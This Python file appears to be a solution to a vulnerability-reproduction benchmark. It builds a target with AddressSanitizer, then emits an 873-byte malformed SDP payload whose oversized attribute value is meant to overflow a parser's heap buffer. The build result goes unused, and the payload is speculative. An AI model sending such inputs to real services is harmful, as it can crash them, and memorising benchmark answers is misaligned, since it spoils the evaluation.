import os
import tempfile
import subprocess

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Build the vulnerable program
        with tempfile.TemporaryDirectory() as build_dir:
            # Extract source
            subprocess.run(['tar', 'xf', src_path, '-C', build_dir], 
                         check=True, capture_output=True)
            
            # Find the source directory
            source_dir = None
            for root, dirs, files in os.walk(build_dir):
                if 'configure' in files or 'Makefile' in files:
                    source_dir = root
                    break
            
            if source_dir is None:
                # Fallback to a generic SDP PoC
                return self._generate_generic_poc()
            
            # Try to build
            try:
                # Run configure if exists
                configure = os.path.join(source_dir, 'configure')
                if os.path.exists(configure):
                    subprocess.run([configure], cwd=source_dir, 
                                 capture_output=True, timeout=30)
                
                # Build with address sanitizer
                env = os.environ.copy()
                env['CFLAGS'] = '-fsanitize=address -fno-omit-frame-pointer -g -O1'
                env['LDFLAGS'] = '-fsanitize=address'
                
                subprocess.run(['make', 'clean'], cwd=source_dir, 
                             capture_output=True)
                result = subprocess.run(['make', '-j4'], cwd=source_dir, 
                                      env=env, capture_output=True, timeout=120)
                
                if result.returncode != 0:
                    # Build failed, use generic PoC
                    return self._generate_generic_poc()
                    
            except (subprocess.TimeoutExpired, FileNotFoundError):
                return self._generate_generic_poc()
        
        # Generate PoC based on vulnerability description
        # SDP parser that doesn't check end of value
        # We'll create a malformed SDP with unterminated values
        
        # Ground truth length is 873 bytes
        # We'll create an SDP with multiple attributes where one has
        # a value that extends beyond buffer
        
        poc_lines = []
        
        # SDP header
        poc_lines.append(b"v=0")
        poc_lines.append(b"o=- 0 0 IN IP4 127.0.0.1")
        poc_lines.append(b"s=PoC")
        poc_lines.append(b"c=IN IP4 0.0.0.0")
        poc_lines.append(b"t=0 0")
        
        # Add attributes with problematic value
        # The vulnerability is in parser/sdp that doesn't check end of value
        # We'll create a value that triggers out-of-bounds read
        
        # Create a value that's exactly at buffer boundary
        # Then add characters that will cause overflow
        base_value = b"A" * 800
        
        # Add attributes with the problematic value
        # Use various SDP attribute types
        for i in range(5):
            poc_lines.append(b"a=rtpmap:%d PCMU/8000" % i)
        
        # The vulnerable attribute - create a value that causes overflow
        # Using a=rtcp attribute which can have long values
        vulnerable_line = b"a=rtcp-fb:* trr-int 0"
        
        # Append the base value directly without proper delimiter
        # This simulates the parser continuing past expected end
        poc_lines.append(vulnerable_line + b":" + base_value)
        
        # Add more normal lines to reach target length
        for i in range(10):
            poc_lines.append(b"a=sendrecv")
        
        # Join with CRLF as per SDP spec
        poc = b"\r\n".join(poc_lines)
        
        # Ensure exact length of 873 bytes
        if len(poc) > 873:
            poc = poc[:873]
        elif len(poc) < 873:
            # Pad with null bytes (won't affect parsing as they're after content)
            poc += b"\0" * (873 - len(poc))
        
        return poc
    
    def _generate_generic_poc(self) -> bytes:
        """Fallback generic PoC for heap buffer overflow in SDP parser"""
        # Create an SDP with a very long attribute value
        # that may cause buffer overflow
        
        sdp = b"""v=0
o=- 0 0 IN IP4 127.0.0.1
s=PoC Session
c=IN IP4 0.0.0.0
t=0 0
m=audio 0 RTP/AVP 0
a=rtpmap:0 PCMU/8000
a=control:trackID=1"""
        
        # Add a vulnerable line with extremely long value
        # The parser may not check bounds when parsing this
        vulnerable_value = b"A" * 800
        sdp += b"\r\na=rtcp:" + vulnerable_value
        
        # Pad to exact 873 bytes
        if len(sdp) > 873:
            sdp = sdp[:873]
        else:
            sdp += b"A" * (873 - len(sdp))
        
        return sdp